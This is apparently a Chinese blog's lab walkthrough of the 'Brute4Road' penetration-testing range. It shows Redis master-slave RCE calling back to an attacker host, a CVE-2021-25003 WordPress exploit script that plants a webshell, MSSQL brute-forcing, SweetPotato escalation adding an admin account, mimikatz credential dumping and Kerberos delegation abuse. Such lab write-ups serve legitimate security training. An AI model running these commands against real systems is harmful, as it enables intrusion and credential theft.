@@ -1,0 +1,499 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>靶场日记-Brute4Road | 『1nv_qaq&#39;s Blog』</title>
+    <meta name="author" content="1nv-qaq" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>wait wait wait...</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>『1NV_QAQ&#39;S BLOG』</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;『1NV_QAQ&#39;S BLOG』</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>靶场日记-Brute4Road</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/5/4
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                渗透测试
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #ffa2c4">
+                    渗透测试
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <ul>
+<li>Redis主从复制RCE</li>
+<li>CVE-2021-25003</li>
+<li>SweetPotato提权</li>
+<li>域渗透：约束委派🎯<span id="more"></span></li>
+</ul>
+<p><code>fscan</code>扫描</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/01.png" alt="img"></p>
+<p><code>6379</code>开放<code>Redis</code><a target="_blank" rel="noopener" href="https://blog.csdn.net/qinglongSpring/article/details/128175195">服务</a>，<code>5.0.12</code>版本可以打<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">主从复制RCE</a></p>
+<p><code>redis-rogue-server.py --rhost 39.99.131.26 --rport 6379 --lhost 82.156.158.101 --lport 5555 --exp exp.so</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/02.png" alt="img"></p>
+<p>修改一下交互方式<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/03.png" alt="img"></p>
+<p>没权限读<code>/home/redis/flag/flag01</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/04.png" alt="img"></p>
+<p><code>find / -user root -perm /4000 2&gt;/dev/null</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/05.png" alt="img"></p>
+<p>有base64，读flag01</p>
+<p><code>base64 &#39;/home/redis/flag/flag01&#39; | base64 --decode</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/06.png" alt="img"></p>
+<p><code>netstat -ano</code>查看内网网段</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/07.png" alt="img"></p>
+<p><code>wget</code>传<code>fscan</code>扫</p>
+<pre><code class="Plain">./fscan -h 172.22.2.7/24
+┌──────────────────────────────────────────────┐
+│    ___                              _        │
+│   / _ \     ___  ___ _ __ __ _  ___| | __    │
+│  / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /    │
+│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │
+│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
+└──────────────────────────────────────────────┘
+      Fscan Version: 2.0.0
+
+[2025-05-03 14:10:07] [INFO] 暴力破解线程数: 1
+[2025-05-03 14:10:07] [INFO] 开始信息扫描
+[2025-05-03 14:10:07] [INFO] CIDR范围: 172.22.2.0-172.22.2.255
+[2025-05-03 14:10:07] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)
+[2025-05-03 14:10:07] [INFO] 解析CIDR 172.22.2.7/24 -&gt; IP范围 172.22.2.0-172.22.2.255
+[2025-05-03 14:10:08] [INFO] 最终有效主机数量: 256
+[2025-05-03 14:10:08] [INFO] 开始主机扫描
+[2025-05-03 14:10:08] [INFO] 正在尝试无监听ICMP探测...
+[2025-05-03 14:10:08] [INFO] 当前用户权限不足,无法发送ICMP包
+[2025-05-03 14:10:08] [INFO] 切换为PING方式探测...
+[2025-05-03 14:10:08] [SUCCESS] 目标 172.22.2.3      存活 (ICMP)
+[2025-05-03 14:10:08] [SUCCESS] 目标 172.22.2.7      存活 (ICMP)
+[2025-05-03 14:10:08] [SUCCESS] 目标 172.22.2.16     存活 (ICMP)
+[2025-05-03 14:10:08] [SUCCESS] 目标 172.22.2.18     存活 (ICMP)
+[2025-05-03 14:10:08] [SUCCESS] 目标 172.22.2.34     存活 (ICMP)
+[2025-05-03 14:10:14] [INFO] 存活主机数量: 5
+[2025-05-03 14:10:14] [INFO] 有效端口数量: 233
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.7:80
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.3:88
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.18:22
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.7:22
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.7:21
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.16:135
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.3:135
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.34:139
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.18:139
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.16:139
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.34:135
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.3:139
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.3:445
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.3:389
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.16:80
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.18:80
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.34:445
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.16:445
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.16:1433
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.7:6379
+[2025-05-03 14:10:14] [SUCCESS] 端口开放 172.22.2.18:445
+[2025-05-03 14:10:14] [SUCCESS] 服务识别 172.22.2.18:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]
+[2025-05-03 14:10:14] [SUCCESS] 服务识别 172.22.2.7:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]
+[2025-05-03 14:10:14] [SUCCESS] 服务识别 172.22.2.7:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]
+[2025-05-03 14:10:19] [SUCCESS] 服务识别 172.22.2.7:80 =&gt; [http] 版本:1.20.1 产品:nginx
+[2025-05-03 14:10:19] [SUCCESS] 服务识别 172.22.2.3:88 =&gt; 
+[2025-05-03 14:10:19] [SUCCESS] 服务识别 172.22.2.34:139 =&gt;  Banner:[.]
+[2025-05-03 14:10:19] [SUCCESS] 服务识别 172.22.2.16:139 =&gt;  Banner:[.]
+[2025-05-03 14:10:20] [SUCCESS] 服务识别 172.22.2.3:139 =&gt;  Banner:[.]
+[2025-05-03 14:10:20] [SUCCESS] 服务识别 172.22.2.3:445 =&gt; 
+[2025-05-03 14:10:20] [SUCCESS] 服务识别 172.22.2.3:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
+[2025-05-03 14:10:20] [SUCCESS] 服务识别 172.22.2.16:80 =&gt; [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows
+[2025-05-03 14:10:20] [SUCCESS] 服务识别 172.22.2.34:445 =&gt; 
+[2025-05-03 14:10:20] [SUCCESS] 服务识别 172.22.2.16:445 =&gt; 
+[2025-05-03 14:10:20] [SUCCESS] 服务识别 172.22.2.16:1433 =&gt; [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.]
+[2025-05-03 14:10:22] [SUCCESS] 服务识别 172.22.2.18:80 =&gt; [http]
+[2025-05-03 14:11:14] [SUCCESS] 服务识别 172.22.2.18:139 =&gt; 
+[2025-05-03 14:11:15] [SUCCESS] 服务识别 172.22.2.7:6379 =&gt; 
+[2025-05-03 14:11:15] [SUCCESS] 服务识别 172.22.2.18:445 =&gt; 
+[2025-05-03 14:11:19] [SUCCESS] 服务识别 172.22.2.16:135 =&gt; 
+[2025-05-03 14:11:19] [SUCCESS] 服务识别 172.22.2.3:135 =&gt; 
+[2025-05-03 14:11:19] [SUCCESS] 服务识别 172.22.2.34:135 =&gt; 
+[2025-05-03 14:11:20] [INFO] 存活端口数量: 21
+[2025-05-03 14:11:20] [INFO] 开始漏洞扫描
+[2025-05-03 14:11:20] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle
+[2025-05-03 14:11:20] [SUCCESS] NetInfo 扫描结果
+目标主机: 172.22.2.34
+主机名: CLIENT01
+发现的网络接口:
+   IPv4地址:
+      └─ 172.22.2.34
+[2025-05-03 14:11:20] [SUCCESS] 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS
+[2025-05-03 14:11:20] [SUCCESS] NetBios 172.22.2.34     XIAORANG\CLIENT01             
+[2025-05-03 14:11:20] [SUCCESS] 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found
+[2025-05-03 14:11:20] [INFO] 系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393]
+[2025-05-03 14:11:20] [SUCCESS] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393
+[2025-05-03 14:11:20] [SUCCESS] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393
+[2025-05-03 14:11:20] [INFO] 系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393]
+[2025-05-03 14:11:20] [SUCCESS] NetInfo 扫描结果
+目标主机: 172.22.2.3
+主机名: DC
+发现的网络接口:
+   IPv4地址:
+      └─ 172.22.2.3
+[2025-05-03 14:11:20] [SUCCESS] NetInfo 扫描结果
+目标主机: 172.22.2.16
+主机名: MSSQLSERVER
+发现的网络接口:
+   IPv4地址:
+      └─ 172.22.2.16
+[2025-05-03 14:11:20] [SUCCESS] 匿名登录成功!
+[2025-05-03 14:11:20] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable
+[2025-05-03 14:11:20] [SUCCESS] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        
+[2025-05-03 14:11:20] [SUCCESS] SMB认证成功 172.22.2.18:445 administrator:123456
+[2025-05-03 14:11:20] [INFO] SMB2共享信息 172.22.2.18:445 administrator Pass:123456 共享:[print$ IPC$]
+[2025-05-03 14:11:20] [SUCCESS] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点
+[2025-05-03 14:11:22] [INFO] SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$]
+[2025-05-03 14:11:28] [SUCCESS] SMB认证成功 172.22.2.16:445 admin:123456
+</code></pre>
+<p>整理一下</p>
+<pre><code class="Plain">172.22.2.3-&gt;DC
+172.22.2.7-&gt;外网
+172.22.2.16-&gt;mssql
+172.22.2.18-&gt;wordpress
+172.22.2.34     
+</code></pre>
+<p>搭<code>frp</code>代理，先看<code>.18</code>的wordpress</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/08.png" alt="img"></p>
+<p><code>wpscan</code>扫</p>
+<p><code>proxychains4 wpscan --url http://172.22.2.18/</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/09.png" alt="img"></p>
+<p>插件有问题，<a target="_blank" rel="noopener" href="https://github.com/biulove0x/CVE-2021-25003">CVE-2021-25003</a></p>
+<p>成功rce</p>
+<pre><code class="Plain">\CVE-2021-25003-main&gt;python WpCargo.py -t http://172.22.2.18/
+
+############################################
+# @author : biulove0x                      #
+# @name   : WP Plugins WPCargo Exploiter   #
+# @cve    : CVE-2021-25003                 #
+############################################
+
+[-] http://172.22.2.18/wp-content/wp-conf.php =&gt; Uploaded!
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/10.png" alt="img"></p>
+<pre><code class="python">import sys
+import binascii
+import requests
+
+# This is a magic string that when treated as pixels and compressed using the png
+# algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file
+payload = &#39;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#39;
+
+def encode_character_code(c: int):
+    return &#39;&#123;:08b&#125;&#39;.format(c).replace(&#39;0&#39;, &#39;x&#39;)
+
+text = &#39;&#39;.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]
+
+destination_url = &#39;http://172.22.2.18/&#39;
+cmd = &#39;ls&#39;
+
+# With 1/11 scale, &#39;1&#39;s will be encoded as single white pixels, &#39;x&#39;s as single black pixels.
+
+requests.get(
+    f&quot;&#123;destination_url&#125;wp-content/plugins/wpcargo/includes/barcode.php?text=&#123;text&#125;&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;
+)
+
+# We have uploaded a webshell - now let&#39;s use it to execute a command.
+
+print(requests.post(
+    f&quot;&#123;destination_url&#125;webshell.php?1=system&quot;, data=&#123;&quot;2&quot;: cmd&#125;
+).content.decode(&#39;ascii&#39;, &#39;ignore&#39;))
+</code></pre>
+<p>写马，蚁剑连接</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/11.png" alt="img"></p>
+<p>在<code>wp-config.php</code>下读到用户名密码<code>wpuser:WpuserEha8Fgj9</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/12.png" alt="img"></p>
+<p>上线数据库得到flag02</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/13.png" alt="img"></p>
+<p><code>flag&#123;c757e423-eb44-459c-9c63-7625009910d8&#125;</code></p>
+<p><code>S0meth1ng_y0u_m1ght_1ntereSted</code>表中有一千个用户密码</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/14.png" alt="img"></p>
+<p>猜测为<code>.16</code>机器上<code>mssql</code>服务的密码本，尝试爆破</p>
+<p><code>proxychains4 -q hydra -l sa -P passwd.txt 172.22.2.16 mssql -f</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/15.png" alt="img"></p>
+<p>拿到<code>mssql</code>用户名（默认<code>sa</code>）密码<code>sa:ElGNkOiC</code></p>
+<p>MDUT连接</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/16.png" alt="img"></p>
+<p>低权限，开Ole，上传<code>SweetPotato</code>提权</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/17.png" alt="img"></p>
+<p><code>C:/Users/Public/SweetPotato.exe -a &quot;netstat -ano&quot;</code>发现开放<code>3389</code>端口</p>
+<p>尝试添加新用户</p>
+<pre><code>C:/Users/Public/SweetPotato.exe -a &quot;net user qaq1nv AbcD9635! /add&quot;
+C:/Users/Public/SweetPotato.exe -a &quot;net localgroup administrators qaq1nv /add&quot;
+</code></pre>
+<p>注意用户名和密码设置复杂一些，<code>rdp</code>登录，拿到flag03</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/18.png" alt="img"></p>
+<p><code>flag&#123;3f2ecac5-b501-4d37-bc8b-f12e9ee13dc0&#125;</code></p>
+<p><code>systeminfo</code>发现域环境</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/19.png" alt="img"></p>
+<p><code>mimikatz</code>抓取域内用户hash</p>
+<pre><code>privilege::debug
+sekurlsa::logonPasswords
+exit
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/20.png" alt="img"></p>
+<p><code>cea3e66a2715c71423e7d3f0ff6cd352</code></p>
+<p><code>Rubeus</code>编译出来的版本不对，换<code>kekeo</code>打</p>
+<p><code>mimikatz</code>导出<code>MSSQLSERVER</code>的票据</p>
+<pre><code class="Plain">privilege::debug
+sekurlsa::tickets /export
+exit
+</code></pre>
+<p><code>kekeo</code>申请服务票据</p>
+<pre><code class="Plain">tgs::s4u /tgt:[0;3e4]-2-1-40e10000-MSSQLSERVER$@krbtgt-XIAORANG.LAB.kirbi /user:Administrator@XIAORANG.LAB /service:cifs/DC.XIAORANG.LAB
+exit
+</code></pre>
+<p><code>mimikatz</code>打<code>ptt</code></p>
+<pre><code>kerberos::ptt TGS_Administrator@XIAORANG.LAB@XIAORANG.LAB_cifs~DC.XIAORANG.LAB@XIAORANG.LAB.kirbi
+exit
+</code></pre>
+<p>读到flag04</p>
+<pre><code class="Plain">dir \\DC.xiaorang.lab\C$\Users\Administrator
+type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/21.png" alt="img"></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Brute4Road/22.png" alt="img"></p>
+<p>还是得系统学学域渗透</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2024 - 2025 『1nv_qaq&#39;s Blog』
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;1nv-qaq
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    <script src="/js/<fireworks.min.js>"></script>
+
+
+    <canvas
+    id="fireworks"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"
+></canvas>
+<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+<script src="/js/fireworks.min.js"></script>
+
+
+
+
+    
+    
+
+
+
+
+    
+</body>
+</html>
